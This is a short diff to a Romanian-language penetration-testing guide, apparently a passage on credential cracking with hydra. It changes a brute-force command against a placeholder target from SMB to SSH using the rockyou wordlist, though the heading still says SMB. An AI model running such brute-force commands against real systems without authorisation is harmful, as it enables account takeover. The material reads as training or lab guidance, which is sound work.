@@ -175,7 +175,7 @@ Unul dintre cele mai rapide și flexibile instrumente pentru spargerea credenți
 * **Atac pe serviciul SMB (Rețea):**
   Dacă ai aflat un username din `enum4linux`, folosește:
   ```bash
-  hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP_TINTA> smb
+  hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<IP_TINTA>
   ```
 
 * **Atac pe formulare Web (HTTP-POST):**
